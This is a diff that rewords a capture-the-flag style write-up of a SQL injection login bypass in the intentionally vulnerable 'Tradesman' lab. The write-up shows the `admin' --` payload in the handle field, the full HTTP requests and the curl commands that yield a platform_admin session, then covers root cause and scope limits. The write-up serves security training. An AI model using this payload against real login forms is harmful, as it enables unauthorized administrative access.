@@ -1,11 +1,11 @@
 ---
-title: "WebVerse Tradesman — SQL Injection Authentication Bypass to Platform Admin Access"
+title: "WebVerse Tradesman: SQL Injection Authentication Bypass to Platform Admin Access"
 date: 2026-08-08T00:00:00+02:00
 lastmod: 2026-08-13T00:00:00+02:00
 draft: false
 author: "Mdk22"
 description: "A legacy seller login accepted SQL comment syntax in the handle field, bypassing password authentication and issuing a platform_admin session."
-summary: "A controlled SQL injection in the legacy seller login changed a normal rejection into an authenticated admin session. Caido evidence and an independent curl flow both reached the linked administrators-only notes resource."
+summary: "SQL syntax in the legacy seller login changed a normal rejection into an admin session. Caido and curl both reached the linked administrators-only notes page."
 categories:
   - "Web Security Write-Ups"
 tags:
@@ -53,11 +53,11 @@ Tradesman exposed a legacy seller authentication flow at `POST /seller/login`. T
 
 A single apostrophe remained on the normal invalid-login path. Changing only the `handle` value to a structured SQL comment payload changed the behavior: the server returned HTTP 302 to `/seller/dashboard` and issued a new session cookie. Reusing that newly issued session loaded the dashboard with HTTP 200 and identified the active account as `admin` with the `platform_admin` role.
 
-The same session reached the dashboard-linked `/seller/dashboard/admin-notes` route. The response described the notes as internal and administrators-only, then returned the lab's integration-key objective. The full flow was reproduced independently with curl using a fresh cookie jar. Testing stopped after the read-only objective was confirmed.
+The same session reached `/seller/dashboard/admin-notes` from the dashboard. The page described the notes as internal and administrators-only, then returned the lab's integration-key flag. I repeated the full flow with `curl` and a fresh cookie jar, then stopped after the read-only flag was confirmed.
 
 > **CONFIRMED FINDING**
 >
-> The seller login accepts attacker-controlled SQL structure through `handle`. A targeted comment payload bypasses the password-dependent authentication boundary for the demonstrated `admin` account, resulting in a server-issued session accepted as `platform_admin`.
+> The seller login inserts `handle` into SQL. A targeted comment payload bypasses the password check for the tested `admin` account, and the server issues a session accepted as `platform_admin`.
 
 ## 1. Report Profile
 
@@ -72,8 +72,8 @@ The same session reached the dashboard-linked `/seller/dashboard/admin-notes` ro
 | Protected resource | `/seller/dashboard` |
 | Objective resource | `/seller/dashboard/admin-notes` |
 | Verified role | `admin` / `platform_admin` |
-| Primary weakness | CWE-89 — SQL Injection |
-| Evidence | Fresh-instance Caido reproduction and independent curl verification |
+| Primary weakness | CWE-89: SQL Injection |
+| Evidence | Fresh Caido reproduction and `curl` verification |
 
 ### Verified Attack Chain
 
@@ -86,7 +86,7 @@ GET /seller/dashboard without an authenticated session
   > HTTP 302 to /seller/login
 Single-quote control in handle
   > HTTP 200, normal invalid-login marker
-Controlled SQLi mutation: handle=admin' -- <trailing space>
+SQLi test: handle=admin' -- <trailing space>
   > HTTP 302 to /seller/dashboard
   > Set-Cookie: session=<REDACTED>
 Reuse only the newly issued session
@@ -102,16 +102,16 @@ Independent curl reproduction
 
 The reproduction was limited to the intentionally vulnerable Tradesman lab and the seller login, protected dashboard, and dashboard-linked read-only notes route. Historical material supplied the expected route grammar and vulnerability theme only; dynamic responses, session state, and objective evidence were collected from the active instance.
 
-- The password value remained the same known-invalid test string during the controlled request differential.
+- The password stayed on the same known-invalid test value while only `handle` changed.
 - No database enumeration, extraction, write action, or unrelated dashboard functionality was tested.
 - Session values are redacted and excluded from the public artifact.
 - The published evidence supports the SQL injection, authenticated-session transition, role-bearing dashboard access, and the read-only objective. It does not claim source-code access, database-engine identification, or broader administrative capability.
 
-Caido captured the primary request and response evidence. curl independently repeated the decisive login and readback flow with its own fresh cookie jar.
+Caido captured the main requests and responses. `curl` repeated the login and protected-page flow with a fresh cookie jar.
 
-## 3. Evidence-Led Chronological Reproduction
+## 3. Step-by-Step Reproduction
 
-This section binds each verified request, payload, expected result, and screenshot to the phase in which it was used. Caido remains the primary proof layer, while the final curl cycle independently confirms the decisive transition with a fresh cookie jar. Dynamic host, password, session, and objective values remain normalized with public placeholders.
+This section keeps each request, payload, expected result, and screenshot beside the step where it was used. Caido is the main evidence source, while the final `curl` flow repeats the result with a fresh cookie jar. Temporary host, password, session, and flag values use public placeholders.
 
 ### 3.1 Seller Surface Discovery and Login Contract
 
@@ -127,19 +127,19 @@ The seller sign-in page provided the endpoint and field names directly rather th
 
 ![Seller login HTML showing POST /seller/login and handle and password input names](Tradesman_Figure_01_Caido_Login_Form.png)
 
-**Figure 1 — Login contract.** The active application accepts seller credentials through `POST /seller/login` using the exact `handle` and `password` fields.
+**Figure 1: Login contract.** The active application accepts seller credentials through `POST /seller/login` using the exact `handle` and `password` fields.
 
 ### 3.2 Invalid Login Baseline
 
-An intentionally invalid account established the deterministic rejection path before SQL syntax was introduced.
+A known-invalid account recorded the normal rejection before any SQL syntax was added.
 
-**P-01 — Deliberately invalid handle.**
+**P-01: Invalid handle.**
 
 ```text
 invalid_user@example.local
 ```
 
-**R-01 — Invalid login request.**
+**R-01: Invalid login request.**
 
 ```http
 POST /seller/login HTTP/1.1
@@ -149,7 +149,7 @@ Content-Type: application/x-www-form-urlencoded
 handle=invalid_user%40example.local&password=<REDACTED>
 ```
 
-**Expected semantic result:** HTTP 200 with the stable rejection marker and no authenticated dashboard state.
+**Expected result:** HTTP 200 with the stable rejection marker and no authenticated dashboard state.
 
 ```html
 <div class="form-error">Invalid handle or password</div>
@@ -157,36 +157,36 @@ handle=invalid_user%40example.local&password=<REDACTED>
 
 ![Invalid seller login response showing the Invalid handle or password marker](Tradesman_Figure_02_Caido_Invalid_Login.png)
 
-**Figure 2 — Invalid baseline.** Normal invalid credentials remain on the login path and return the deterministic rejection marker.
+**Figure 2: Invalid baseline.** Normal invalid credentials stay on the login page and return the same rejection marker each time.
 
 ### 3.3 Protected Dashboard Baseline
 
 The target dashboard was requested without an authenticated session before exploitation.
 
-**R-02 — Unauthenticated dashboard request.**
+**R-02: Unauthenticated dashboard request.**
 
 ```http
 GET /seller/dashboard HTTP/1.1
 Host: <LAB_HOST>
 ```
 
-**Expected semantic result:** HTTP 302 with `Location: /seller/login`.
+**Expected result:** HTTP 302 with `Location: /seller/login`.
 
 ![Unauthenticated seller dashboard request redirecting to /seller/login](Tradesman_Figure_03_Caido_Dashboard_Redirect.png)
 
-**Figure 3 — Protected route.** The dashboard is not anonymously accessible before the controlled login mutation.
+**Figure 3: Protected route.** The dashboard is not anonymously accessible before the SQL login test.
 
 ### 3.4 Single-Quote Negative Control
 
 The first mutation tested one SQL metacharacter while retaining the same known-invalid password and request contract.
 
-**P-02 — Lone apostrophe.**
+**P-02: Lone apostrophe.**
 
 ```text
 '
 ```
 
-**R-03 — Quote-control request.**
+**R-03: Quote-control request.**
 
 ```http
 POST /seller/login HTTP/1.1
@@ -196,23 +196,23 @@ Content-Type: application/x-www-form-urlencoded
 handle='&password=<REDACTED>
 ```
 
-**Expected semantic result:** HTTP 200 with the same invalid-login marker. This control does not independently prove or disprove SQL injection; it proves that a quote alone does not authenticate the user.
+**Expected result:** HTTP 200 with the same invalid-login marker. This does not prove or disprove SQL injection; it only shows that a quote alone does not authenticate the user.
 
 ![Lone-quote login control returning the normal invalid-login marker](Tradesman_Figure_04_Caido_Quote_Control.png)
 
-**Figure 4 — Quote control.** The metacharacter alone remains rejected, removing the simpler explanation that any parser anomaly or generic validation defect created the later privileged state.
+**Figure 4: Quote control.** The metacharacter alone remains rejected, removing the simpler explanation that any parser anomaly or generic validation defect created the later privileged state.
 
-### 3.5 Controlled SQL Injection Mutation
+### 3.5 SQL Injection Login Test
 
-The decisive request changed only `handle` to a bounded SQL comment payload and retained the same known-invalid password. The trailing space after `--` is intentional.
+The request that confirmed the issue changed only `handle` to a SQL comment payload and kept the same invalid password. The trailing space after `--` is required by the payload.
 
-**P-03 — Verified authentication-bypass payload.**
+**P-03: Verified authentication-bypass payload.**
 
 ```text
 admin' --
 ```
 
-**R-04 — Controlled proof request.**
+**R-04: Login request with the SQL payload.**
 
 ```http
 POST /seller/login HTTP/1.1
@@ -222,11 +222,11 @@ Content-Type: application/x-www-form-urlencoded
 handle=admin' -- &password=<REDACTED>
 ```
 
-**Expected semantic result:** a change from the normal rejection path to HTTP 302 with `Location: /seller/dashboard` and a newly issued session cookie. This transition is not final proof on its own.
+**Expected result:** a change from the normal rejection path to HTTP 302 with `Location: /seller/dashboard` and a newly issued session cookie. This transition is not final proof on its own.
 
-![Caido request showing the controlled admin SQL comment payload with sensitive values redacted](Tradesman_Figure_05_Caido_SQLi_Request.png)
+![Caido request showing the admin SQL comment payload with sensitive values redacted](Tradesman_Figure_05_Caido_SQLi_Request.png)
 
-**Figure 5 — Controlled mutation.** The route and password remain fixed; the structured `handle` value is the decisive difference. Any pre-existing replay cookie is redacted and is not used as proof.
+**Figure 5: SQL payload request.** The route and password stay fixed; only `handle` changes. Any old Replay cookie is redacted and is not used as proof.
 
 ### 3.6 Server-Issued Authentication Transition
 
@@ -240,13 +240,13 @@ Set-Cookie: session=<REDACTED>
 
 ![Caido response redirecting to the seller dashboard and issuing a redacted session cookie](Tradesman_Figure_06_Caido_SQLi_Response.png)
 
-**Figure 6 — Authentication transition.** The newly issued session is the boundary-crossing artifact; the redirect alone is not treated as sufficient confirmation.
+**Figure 6: Authentication transition.** The newly issued session is the boundary-crossing artifact; the redirect alone is not treated as sufficient confirmation.
 
 ### 3.7 Privileged Session Verification
 
 Only the newly issued session was applied to the dashboard that previously redirected anonymous requests.
 
-**R-05 — Authenticated dashboard request.**
+**R-05: Authenticated dashboard request.**
 
 ```http
 GET /seller/dashboard HTTP/1.1
@@ -254,7 +254,7 @@ Host: <LAB_HOST>
 Cookie: session=<SESSION_COOKIE>
 ```
 
-**Expected semantic result:** HTTP 200 with the authenticated account and role marker.
+**Expected result:** HTTP 200 with the authenticated account and role marker.
 
 ```text
 Signed in as admin with role platform_admin
@@ -262,13 +262,13 @@ Signed in as admin with role platform_admin
 
 ![Authenticated seller dashboard identifying the account as admin with the platform_admin role](Tradesman_Figure_07_Caido_Admin_Dashboard.png)
 
-**Figure 7 — Privileged dashboard.** The application accepts the new session as `admin` / `platform_admin` and exposes a direct navigation link to the admin-notes resource.
+**Figure 7: Privileged dashboard.** The application accepts the new session as `admin` / `platform_admin` and exposes a direct navigation link to the admin-notes resource.
 
 ### 3.8 Administrators-Only Objective Readback
 
 The same SQLi-issued session was used only for the dashboard-linked, read-only notes route.
 
-**R-06 — Administrators-only notes request.**
+**R-06: Administrators-only notes request.**
 
 ```http
 GET /seller/dashboard/admin-notes HTTP/1.1
@@ -276,22 +276,22 @@ Host: <LAB_HOST>
 Cookie: session=<SESSION_COOKIE>
 ```
 
-**Expected semantic result:** HTTP 200, explicit administrators-only context, and the current integration-key objective.
+**Expected result:** HTTP 200, explicit administrators-only context, and the current integration-key objective.
 
 ```text
-Internal — admins only. Notes here are visible to platform staff, never to sellers.
+Internal. Admins only. Notes here are visible to platform staff, never to sellers.
 The current integration key is WEBVERSE{REDACTED}.
 ```
 
 ![Administrators-only notes response showing the integration-key objective redacted for publication](Tradesman_Figure_08_Caido_Admin_Notes_Redacted.png)
 
-**Figure 8 — Objective readback.** The protected resource confirms the authorization context and returns the public-safe lab objective. No additional internal tools, write actions, or unrelated data were accessed.
+**Figure 8: Protected-page readback.** The resource confirms the admin role and returns the redacted lab flag. No other internal tool, write action, or unrelated data was accessed.
 
-### 3.9 Independent curl Reproduction
+### 3.9 Repeating the Flow with curl
 
-The decisive login and readback flow was repeated outside Caido so the result did not depend on Replay state or an existing browser session. Both commands used a fresh local cookie jar. The public forms preserve the executed request semantics while replacing temporary values with placeholders; certificate bypass was not part of the tested condition, so the working terminal's nonessential `-k` option is omitted.
+I repeated the login and protected-page request outside Caido so the result did not depend on Replay state or an existing browser session. Both commands used a fresh cookie jar. The public commands keep the method, path, headers, and body but replace temporary values with placeholders. Certificate bypass was not part of the test, so the unnecessary `-k` option is omitted.
 
-**C-01 — Fresh command-line authentication transition.**
+**C-01: Fresh command-line authentication transition.**
 
 ```bash
 curl -sS -i \
@@ -301,13 +301,13 @@ curl -sS -i \
   "https://<LAB_HOST>/seller/login"
 ```
 
-**Expected semantic result:** HTTP/2 302, `location: /seller/dashboard`, and `set-cookie: session=<REDACTED>`.
+**Expected result:** HTTP/2 302, `location: /seller/dashboard`, and `set-cookie: session=<REDACTED>`.
 
-![Independent curl login reproduction redirecting to the seller dashboard with the session value redacted](Tradesman_Figure_09_Curl_SQLi_Login.png)
+![curl login reproduction redirecting to the seller dashboard](Tradesman_Figure_09_Curl_SQLi_Login.png)
 
-**Figure 9 — Independent login.** A fresh non-Caido request reproduces the same server-issued authentication transition.
+**Figure 9: `curl` login.** A fresh request outside Caido receives the same server-issued session.
 
-**C-02 — Fresh-cookie-jar objective readback.**
+**C-02: Fresh-cookie-jar objective readback.**
 
 ```bash
 curl -sS -i \
@@ -315,19 +315,19 @@ curl -sS -i \
   "https://<LAB_HOST>/seller/dashboard/admin-notes"
 ```
 
-**Expected semantic result:** HTTP/2 200, `admin` / `platform_admin` context, administrators-only content, and `WEBVERSE{REDACTED}`.
+**Expected result:** HTTP/2 200, `admin` / `platform_admin` context, administrators-only content, and `WEBVERSE{REDACTED}`.
 
-![Independent curl readback of the administrators-only notes response with the objective redacted](Tradesman_Figure_10_Curl_Admin_Notes_Redacted.png)
+![curl readback of the administrators-only notes with the flag redacted](Tradesman_Figure_10_Curl_Admin_Notes_Redacted.png)
 
-**Figure 10 — Independent readback.** The curl-created session reaches the same privileged context and independently reproduces the redacted objective.
+**Figure 10: `curl` readback.** The new session reaches the same administrators-only page and returns the redacted flag.
 
-### 3.10 Evidence Conclusion and Stop Boundary
+### 3.10 Final Result and Stop Point
 
-The progression is deliberately bounded: P-01 establishes normal rejection, P-02 shows that a lone quote does not authenticate, and P-03 produces the controlled transition. The new session, explicit role marker, protected readback, and independent curl cycle provide the semantic proof; neither a payload string nor a status code alone is treated as sufficient confirmation.
+The three requests have clear roles. P-01 records a normal rejection, P-02 shows that a quote alone does not log in, and P-03 changes only `handle` and creates a new session. The admin role, protected page, and repeated `curl` flow confirm the bypass. A payload string or status code alone would not be enough.
 
-> **STOP BOUNDARY**
+> **WHERE TESTING STOPPED**
 >
-> Testing stopped after the authorized read-only objective was independently confirmed. No database enumeration, extraction, write action, unrelated dashboard testing, or exploit expansion was performed.
+> Testing stopped after the read-only flag was confirmed. I did not enumerate the database, extract unrelated data, perform writes, test other dashboard functions, or expand the exploit.
 
 ## 4. Root Cause and Classification
 
@@ -340,7 +340,7 @@ WHERE handle = '<handle>'
   AND password = '<password>';
 ```
 
-With the controlled input, the likely semantic effect is:
+With the SQL payload, the likely query effect is:
 
 ```sql
 WHERE handle = 'admin' -- ...password condition...
@@ -350,7 +350,7 @@ The primary mapping is [CWE-89](https://cwe.mitre.org/data/definitions/89.html):
 
 ## 5. False-Positive Controls
 
-The conclusion relies on independent controls instead of one anomalous response:
+The conclusion uses several checks instead of one unusual response:
 
 1. Invalid credentials produced HTTP 200 and the normal rejection marker.
 2. The protected dashboard redirected to login before exploitation.
@@ -359,13 +359,13 @@ The conclusion relies on independent controls instead of one anomalous response:
 5. The new session was accepted by the previously protected dashboard.
 6. The dashboard bound that session to `admin` / `platform_admin`.
 7. The notes route stated that its contents were administrators-only.
-8. An independent curl flow began with a fresh cookie jar and reproduced the privileged readback.
+8. A `curl` flow with a fresh cookie jar reproduced the privileged readback.
 
-This evidence confirms SQL injection and the demonstrated authentication bypass. It does not establish source-code access, database write capability, arbitrary database extraction, command execution, or untested dashboard permissions.
+This confirms SQL injection and authentication bypass. I did not test source-code access, database writes, broad extraction, command execution, or other dashboard permissions.
 
 ## 6. Impact
 
-The verified impact is a password-authentication bypass for the demonstrated `admin` account. The server then issues a session accepted as `platform_admin`, giving access to a previously protected dashboard and its linked administrators-only notes.
+The confirmed impact is a password bypass for the tested `admin` account. The server issues a `platform_admin` session that opens the protected dashboard and its linked administrators-only notes.
 
 The confirmed lab impact is limited to reading the integration-key objective in that notes resource. The dashboard states that the account has access to internal platform tools, but no additional tool access, write actions, or unrelated data collection was tested. In a production environment, impact would depend on account privileges and the data exposed behind the affected authentication boundary.
 
@@ -398,6 +398,6 @@ Audit seller, vendor, staff, and back-office routes that survived frontend rewri
 
 ## Conclusion
 
-Tradesman demonstrates a classic SQL injection at a legacy authentication boundary. A targeted comment payload in `handle` changes a deterministic invalid login into a server-issued session accepted as `admin` / `platform_admin`. The conclusion is supported by the invalid baseline, protected-route baseline, quote control, new-session readback, explicit role marker, administrators-only resource, and independent curl reproduction.
+Tradesman contains a classic SQL injection in a legacy login. A comment payload in `handle` turns a rejected login into a server-issued `admin` / `platform_admin` session. The invalid login, protected-page baseline, quote check, fresh session, explicit role marker, admin-only notes, and repeated `curl` flow all support the result.
 
 The public result is recorded as `WEBVERSE{REDACTED}`. Testing stopped after the authorized, read-only objective was confirmed.
